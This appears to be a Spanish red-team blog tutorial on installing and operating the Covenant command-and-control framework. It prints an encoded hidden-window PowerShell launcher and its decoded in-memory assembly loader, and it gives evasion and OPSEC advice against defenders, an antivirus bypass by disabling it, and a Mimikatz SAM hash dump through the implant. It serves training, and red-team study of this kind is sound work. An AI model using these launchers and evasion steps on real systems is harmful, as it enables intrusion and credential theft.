---
title: Covenant C2 ¿Como funciona un Servidor de Command & Control?
description: Vamos a realizar una introducción al uso de servidores de Command & Control usando Covenant.
date: 2026-01-01
categories: [c2]
tags: [c2, evasion, opsec, domain, persistencia, Formacion]     # Los tags deben estar siempre en minúsculas.
image:
  path: /assets/img/covenantc2/ini.png
---

## 0. ¿Que es es un C2?
Un C2 es un Command & Control, que es básicamente una infraestructura que desplegamos como atacantes para comunicarnos con sistemas comprometidos y automatizar procesos como atacantes. Normalmente un C2 se compone de uno o varios Team Servers que permiten a los atacantes conectarsey con ello poder comunicarse con los equipos, es decir  pueden conectarse varias personas para trabajar de manera colaborativa en los diferentes equipos infectados. <br>
La estructura sería un poco como la que os expongo en el siguiente dibujo, un atacante se conecta al Team Server (mediante un servicio web, un cliente...) y puede comunicarse de manera estructurada con el agente instalado en el equipo infectado.
![Desktop View](/assets/img/covenantc2/0.png)
Existen muchos motivos por los que usar un C2, uno de ellos es poder ocultar la identidad del atacante usando el Team Server (se puede trabajar también usando redirectors para ocultar el propio C2, aunque se sale del alcance de este post) aunque se suelen usar también por la facilidad de gestión de herramientas y el control de las sesiones y equipos infectados de manera estructurada.  Los C2 en general facilitan el trabajo de los atacantes y es por ello que existen multitud de C2 que usamos desde el Red Team, cuando la operación lo requiere, para realizar nuestros ejercicios. Hay que entender que no es "imprescindible" y que no es algo que necesites en pentesting, pero que si es muy muy útil si haces ejercicios de Red Teaming aunque hay que dominar la infraestructura que montas. Si es la primera vez que usas un C2 no suele ser la solución más sencilla para el día a día de un CTF por ejemplo. Muchas veces usar un C2 es algo que llama la atención y puede facilitar el trabajo, os dejo uno sencillo y funcional como es [**Villain**](https://github.com/t3l3machus/Villain) que os puede ayudar si es la primera vez que trasteaís por estos temas. Si te resulta de interés tengo una lista de estrellas en Github llamada [**Lista C2**](https://github.com/stars/c0nfig-17/lists/c2-s) con diferentes servidores y herramientas que tienen este propósito.

## 1. Covenant C2
Para el siguiente post vamos a usar [**Covenant**](https://github.com/cobbr/Covenant) el cual es un servidor C2 de código abierto desarrollado en c#. 
![Desktop View](/assets/img/covenantc2/logo.png)

Covenant tiene muchas funcionalidades aunque uno de los pros por los que estoy trabajando mucho sobre este C2 es que utiliza C# y es muy customizable, por lo que en este momento me viene bastante bien. Durante este post vamos a instalarlo y realizar las tareas básicas que se se harán en cualquier ejercicio, aunque es importante (como verás más adelante) que tengas en cuenta las necesidades de evasión que existirán en su uso. 

## 2. Instalación
El propio repositorio de Covenant tiene un [**tutorial**](https://github.com/cobbr/Covenant/wiki/Installation-And-Startup) para instalarlo existen dos métodos, uno es Docker el cual desaconseja excepto que tengas un dominio de Docker por posibles problemas y con Dotnet, en mi caso prefiero usar Dotnet. AL usar Dotnet hace hincapié en que necesitaremos la versión [**3.1 del SDK**](https://dotnet.microsoft.com/en-us/download/dotnet/3.1) . Es bastante rápido de instalar sabiendo lo que tienes que hacer, os dejo por aquí los pasos. <br>

> En mi caso lo he instalado en Kali ya que me interesa hacerlo así, ya que lo voy a dejar preparado como maqueta para usarlo siempre que necesite. Ten en cuenta que si piensas usar una máquina de laboratorio solo para esto tendrás que tener alcance a los objetivos, ponte las cosas fáciles. 
{: .prompt-info }

```text
wget http://archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.0g-2ubuntu4_amd64.deb
sudo dpkg -i libssl1.1_1.1.0g-2ubuntu4_amd64.deb
sudo apt -f install
ldconfig -p | grep libssl.so.1.1
```

Si lo has instalado bien deberia devolverte:         ```libssl.so.1.1 (libc6,x86-64) => /lib/x86_64-linux-gnu/libssl.so.1.1``` <br>
Ahora instalaremos .NET Core 3.1.  <br>

```text 
sudo apt update
sudo apt install dotnet-runtime-3.1 aspnetcore-runtime-3.1 dotnet-sdk-3.1
```

Y verificamos que está bien instalado: <br>

```text
dotnet --list-sdks
dotnet --list-runtimes
```

Tenemos que setear como variable de entorno permanentemente lo siguiente: 
```text
echo 'export DOTNET_SYSTEM_GLOBALIZATION_INVARIANT=1' >> ~/.zshrc
source ~/.zshrc
```

Y en este punto ya instalamos Covenant. <br>

```text
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd covenant/covenant
dotnet run
```

Y ya lo tendriamos! <br>
![Desktop View](/assets/img/covenantc2/1.png)

Ahora configuramos lo más importante, sin discusión:
![Desktop View](/assets/img/covenantc2/2.png)


## 3. Listeners
Lo primero que te toca definir es como va a llegar el tráfico de los implantes que has elaborado hacia ti. Es por ello que necesitas definir tus listeners. Covenant tiene la posibilida de definir [**listeners**](https://github.com/cobbr/Covenant/wiki/Listeners) y [**Bridge listeners**](https://github.com/cobbr/Covenant/wiki/Bridge-Listeners). Además te permite definir [**perfiles custom**](https://github.com/cobbr/Covenant/wiki/Listener-Profiles). <br>
El proceso es bastante sencillo, pero vamos a definir la funcionalidad sobre todo. Tenemos que entender que cuando tengamos nuestro agente instalado en una máquina comprometida debe de tener la capacidad de realizar un tráfico estructurado que nos permita identificar que es él así como recibir la información que nos traslada. Es por ello que si no definimos bien como comunicarnos con él tendremos problemas y no queremos conseguir un compromiso inicial y meter la pata en este punto. 
![Desktop View](/assets/img/covenantc2/5.png)

Una vez entendido el concepto lo configuramos de manera sencilla. 
![Desktop View](/assets/img/covenantc2/4.png)

> Aquí dos consideraciones con respecto al OPSEC. El uso de puertos poco comunes como podrías hacer en un CTF ayuda a identificarte, por lo que es habitual usar protocolos aparentemente inofensivos. También otra característica del malware suele ser el uso de cifrado en las comunicaciones, lo cual puede levantar sospechas, por lo que yo usaré una configuración muy muy sencilla usando el puerto 80 y no usando SSL ya que para mi uso concreto estas son las consideraciones de OPSEC necesarias, en otros casos pueden ser otras ya que lo OP-eracional de OPSEC no implica mecanicismo. 
{: .prompt-tip }

Ahora una vez entendida la función del listener podemos entender mejor lo que es un [**perfil custom**](https://github.com/cobbr/Covenant/wiki/Listener-Profiles). Tenemos que tener en cuenta que vamos a enviar y recibir una serie de respuestas y que estas respuestas serán vistas no solo por nosotros, sino también por el blue team. Pero.... ¿esto que implica?. Bien, cuando se consigue categorizar tráfico como el de un posible C2 por parte de un sistema o de nuestro Blue Team estos tratarán de mitigar el impacto realizando una investigación sobre el tráfico que enviamos así como otros IOCs (Indicadores de Compromiso) que habremos ido dejando en nuestras actividades, es por ello que el tipo de tráfico que enviemos, como lo enviemos, a donde lo enviemos... todo cuenta tanto para identificarnos como para atribuir a un actor de amenazas determinado un posible ataque. Tenemos que tener en cuenta que, aunque se le da menos peso durante el propio incidente, la "atribución" puede ser determinante para resolver el incidente, ya que puedes contar con TTPS de este atacante o IOCs de otros ataques anteriores para priorizar acciones. <br>
No vamos a entrar mucho más a detalle en este post a la customización del profile, aunque tienes que tener en cuenta que es relevante no solo para una investigación manual sino porque ciertas peticiones están ya flageadas por las soluciones de AV, por lo que el tráfico por defecto propuesto para nuestro listener puede que no sea una opción en un entorno real. Por otro lado aclarar que si vien Covenant tiene principalmente tráfico HTTP la mayoría de C2s ofrece soluciones de tráfico através de otros protocolos como puede ser DNS o SMB lo cual tiene aplicaciones, necesidades y funciones concretas.
![Desktop View](/assets/img/covenantc2/6.png)


## 4. Launchers
Los Lauchers son diferentes formas de obtener nuestra carga maliciosa que dará lugar a la ejecución del Grunt. Como puedes ver hay muchos tipos dependiendo de lo que necesites en cada momento y el grado de customización que vayas a aplicar. Aquí lo importante será hacer algo que nos sea útil.
![Desktop View](/assets/img/covenantc2/7.png)

En mi caso para esta demo voy a utilizar powershell, por lo que voy a configurarlo. Como podemos ver tendremos que seleccionar diferentes parámetros dependiendoo de las necesidades que tengamos, así como podemos autohospedar nuestro launcher para poder lanzar una petición y descargarlo desde la máquina comprometida o podemos ver el código del mismo. Como ves hay un punto importante, este Launcher apuntará a mi listener que he configurado previamente. A ninguno otro salvo que yo lo indique. 
![Desktop View](/assets/img/covenantc2/8.png)

Una vez lo genero tendré acceso al launcher o el launcher encodeado en Base64 para poder ejecutarlo en la máquina comprometida. S
![Desktop View](/assets/img/covenantc2/9.png)

Según lo ejecutemos tendremos nuestro Grunt activo.
![Desktop View](/assets/img/covenantc2/10.png)

Pero esto ha sido muy fácil..... y lo peor no estamos entendiendo que ha hecho.... y es que si vale hemos lanzado un payload en powershell usando [System.Reflection.Assembly]::Load() como nos dice covenant pero ¿que hace ese snippet?

```text
powershell -Sta -Nop -Window Hidden -EncodedCommand cwB2ACAAbwAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACkAOwBzAHYAIABkACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQB {...} QApAHwATwB1AHQALQBOAHUAbABsAA==
```

Bueno pues vamos a sacarlo sencillo y con nuestro amigo chatgpt para no dar muchas vueltas. 

```text
sv o (New-Object IO.MemoryStream);
sv d (New-Object IO.Compression.DeflateStream(
    [IO.MemoryStream][Convert]::FromBase64String('7Vp7cFtldj/...'), # <--payload
    [IO.Compression.CompressionMode]::Decompress
));
sv b (New-Object Byte);
sv r ((gv d).Value.Read((gv b).Value,0,1024));
while((gv r).Value -gt 0){
    (gv o).Value.Write((gv b).Value,0,(gv r).Value);
    sv r ((gv d).Value.Read((gv b).Value,0,1024));
}
[Reflection.Assembly]::Load(
    (gv o).Value.ToArray()
).EntryPoint.Invoke(0,@([string[]]@())) | Out-Null


```

![Desktop View](/assets/img/covenantc2/11.jpeg)

Es decir, que con este código estamos decodificando y descomprimiendo un assembly que se encuentra dentro de un base64 y ejecutandolo en memoria.... vale, pues ya sabemos algo más no? ¿Esto es lo que se conoce como un malware fileless no? capaz de evadir hasta los EDRs más sofisticados y sortear las mejores protecciones del mercado. Y todo gratis, fácil y usable. Automatizable.....
![Desktop View](/assets/img/covenantc2/12.jpeg)

Vamos no me jodas. Hasta el windows defender nos ha pillado.... Además de parar la ejecución si nos fijamos ha hecho dos cosas 1)Ha clasificado nuestro payload como Covenant y 2)Nos dice que proceso ha sido y que ha sido detectado mediante [**AMSI**](https://learn.microsoft.com/es-es/windows/win32/amsi/antimalware-scan-interface-portal) . 
![Desktop View](/assets/img/covenantc2/13.jpeg)


Bueno no frustrarse, esto es normal. Vamos a hacer una pequeñisima introducción a que ha pasado y en otro post comentaré con más detalles como funcionan estos controles y bypases a estos. Básicamente la detección se ha fundamentado en dos factores:
1) AMSI: Amsi es una intergaz de wndows que permite inspeccionar el contenido real de scripts cuando se ejecutan, por lo que este control ha detectado un comportamiento malicioso y ha levantado la mano.
2) Reutilización de código: Hemos sido poco originales. Este es el Loader y comportamiento por defecto de Covenant, si no modificamos el comportamiento y tratamos de dificultar la detección conseguirá de manera sencilla identificar el comportamiento malicioso. Es algo bastante habitual que nos detecten hasta las soluciones de antivirus más sencillas

De hecho ya que nos ha detectado Defender vamos a ver mediante Virus Total cuantas soluciones nos habrían detectado, sorprendentemente solo 8 de 62, aunque empiezo a pensar que algunas soluciones son estafas ya que nunca detectan nada en Virus Total. 
![Desktop View](/assets/img/covenantc2/14.png)

## 5. Grunts
Bueno vamos a deshabilitar por el momento el antivirus y vamos a ver la funcionalidad del Grunt. Recuerda que tenemos en lka wiki la [**documentación sobre Grunt**](https://github.com/cobbr/Covenant/wiki/Grunt-Interaction) . Un Grunt es como llama al creador de este Covenant a un Beacon de Cobalt Strike, lo que viene a ser un Implante, en este caso de código C#, que nos permite ejecutar diversas acciones y movernos teniendo una sesión estructurada en la máquina. Es importante entender que la sesión no es una simple revershell o una webshell, sino que lo que estamos realizando es establecer un implante. Al trabajar con implantes diseñamos diferentes soluciones para cada uno de nuestros problemas, habrá implantes que nos serán útiles para generar persistencias de un tipo, o para elevar privilegios, o accesos iniciales.... las soluciones son diferentes para cada uno de los puntos de nuestra killchain. El objetivo es no solo tener comunicación con la máquina que comprometemos, sino que la comunicación se ade calidad, es decir, que podamos interactuar libremente, podamos pivotar facilmente, si se nos cae la sesión vuelva sola... y podamos tener muchas más funcionalidades sobre nuestro implante.  <br>
Volvamos a nuestro implante exitoso, como podemos ver existen diferentes características las cuales tiene nuestro implante. 
![Desktop View](/assets/img/covenantc2/15.png)

Como podemos ver tenemos el proceso que ha sido ejecutado, el nombre de la máquina, su IP, si pertenece a un dominio, quien ha ejecutado el proceso, cuando se ha activado y cuando es la última vez que nuestro Grunt ha dicho "hey! estoy vivo!". Esto último es importante.... vamos a pararnos a explicarlo.... <br>
Las comunicaciones como hemos dicho están estructuradas, por lo que nuestro Grunt ejecuta acciones con una temporalidad predefinida de cara a dificultar la detección. Imaginemos que conseguimos comprometer una máquina e instalamos un software que no solo aumenta el consumo de recursos sino que encima genera un tráfico llamativo al exterior hacia un sitio que no es común... va a ser fácil de detectar sobre todo si es mucho tráfico. De manera habitual como atacantes tratamos de reproducir comportamientos normales que podrían ser de un usuario normal de cara a dificultar la detección, por lo que si generasemos un proceso nuevo que envia tráfico de manera constante serían fácil de analizar y llamativo. Un ejemplo de utilización maliciosa de un comportamiento que puede estar excepcionado es el que tengo en otro post sobre la generación de un [**Dropper de AnyDesk para persistencia**](https://c0nfig17.com/posts/Dropper-de-AnyDesk-y-m%C3%A9todos-de-persistencia/) . En este caso la lógica que seguimos es, cuanto menos tráfico y menos ruidoso mejor porque estamos en un equipo y comunicandonos hacia fuera. Es por eso que cuando ejecutamos un comando no se ejecuta directamente en la máquina sino que Covenant espera a enviar la tarea el tiempo que hayamos definido y el implante nos enviará la respuesta en el tiempo definido, no es interactivo ni aleatorio. 
![Desktop View](/assets/img/covenantc2/16.png)

Pongamonos en el caso en el que comprometemos un equipo y conseguimos establecer nuestro implante.... ¿nos interesa tratar de elevar privilegios y enumerar la máquina ahora mismo? Pues en un CTF o si estamos limitados por tiempos, como suele pasar en los ejercicios de Red Team, pues tocará lanzarse o ver como hacerlo... pero es importante entender que un atacante que haya conseguido un compromiso inicial no realizará acciones posteriores salvo que se vea obligado, y menos acciones sobre el host. Lo principal será mantenerse oculto, por lo que o trata de establecer persistencias sencillas o simplemente establecerá un sleep a su implante de 1 mes y esperará pacientemente. Aquí ya depende del tipo de actor que estás simulando, lo bien que quieras hacer las cosas y lo dificil que se lo queiras poner al blue team. <br>

Volviendo a las funcionalidades del grunt tenemos diferentes acciones ya preconfiguradas que nos permite ejecutar le grunt directamente en la máquina. En mi caso para realizar la prueba os dejo un simple whoami con el usuario normal. 
![Desktop View](/assets/img/covenantc2/17.png)

Parte de lo chulo de tener nuestro propio C2 es que podemos preparar herramientas para desplegarse de manera sencilla en las máquinas que comprometemos. En este caso por ejemplo he ejecutado como administrador el launcher para tener privilegios y he ejecutado un dump de SAM con mimikatz en un solo comando y sin tener que dropear un mimikatz a la máquina y enfrentarnos a ese problema de detección (aunque nos estamos enfrentando a otros con la propia ejecución... no significa que no seamos detectables.)
![Desktop View](/assets/img/covenantc2/18.png)


## 6. Datos y gráficos
Una de las duncionalidades que tenemos es un gráfico de los implantes que tenemos y desde que listeners se están consumiendo. 
![Desktop View](/assets/img/covenantc2/19.png)

Aunque una de las más interesantes en lso C2 (Sobre todo para los más desorganizados) es el almacenar información relevante del propio ejercicio. En este caso por ejemplo tenemos los hashes obtenidos durante las acciones que he realizado. 
![Desktop View](/assets/img/covenantc2/20.png)

Aunque podemos obtener también otra información que hemos centralizado en el C2 para facilitarnos nuestro trabajo. 


## 7. Task
Las task que tenemos por defecto vienen preparadas para poder ejecutar acciones de diferentes tipos sobre nuestro implante, maliciosas o normales. 
![Desktop View](/assets/img/covenantc2/21.png)

Lo mejor de todo esto es que podemos crear las que nosotros queramos e implementarlas. Gran parte de este código parte de librerias de código, ensabladores y recursos embebidos que también pueden ser modificados e incluidos para poder trabajar de manera sencilla. Por lo que si queremos incluir nuevas herramientas podemos customizarlo facilmente. <br>
También podremos ver un listado de cada unas de las acciones que hemos ejecutado como un timelog. 
![Desktop View](/assets/img/covenantc2/22.png) 


## 8. Implant Templates
Una de las facilidades que nos da Covenant es la posibilidad de escribir en C# nuestros propios implantes para comunicarnos con el C2. Eso nos ayuda de cara a evadir detecciones y establecer capabilities en nuestro implante de manera sencilla. 
![Desktop View](/assets/img/covenantc2/23.png) 

Además podemos modificar las propias templates de implantes que nos da Covenant para poder modificar lo que necesitemos. 
![Desktop View](/assets/img/covenantc2/24.png)



---
## Apoya el contenido de ciberseguridad en castellano

Si esta publicación te ha sido útil y quieres apoyar mi trabajo para que continúe creando más contenido, aquí te dejo algunas formas de apoyar:

1. **Compartir el contenido**  📲
   Si crees que esta guía puede ser útil para otras personas, compartirla en tus redes sociales es una gran ayuda. 

2. **Donar en Ko-fi**  💖
   Puedes hacer una donación rápida a través de Ko-fi para ayudarme a seguir publicando guías y tutoriales. ¡Cada aportación cuenta y es muy apreciada! 

   <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script><script type='text/javascript'>kofiwidget2.init('Apoya este contenido!', '#455d85', 'A0A41BO608');kofiwidget2.draw();</script> 
   
3. **Usa mi enlace de afiliado de NordVPN y NordPass para mejorar tu seguridad y apoyar la creación de contenido**  🛡️
   Puedes suscribirte a [**NordVPN**](https://go.nordvpn.net/aff_c?offer_id=15&aff_id=132246&url_id=902) con un 75% de descuento y 3 meses gratis o a [**NordPass**](https://nordpass.com/special/?utm_medium=affiliate&utm_term&utm_content&utm_campaign=off488&utm_source=aff132246&aff_free) con un 53% de descuento y 3 meses gratis y mejorar tu seguridad a la vez que apoyas el contenido de ciberseguridad en español. <br>

---

¡Gracias por tu apoyo! 🙏
![Desktop View](/assets/img/banner.png) <br>
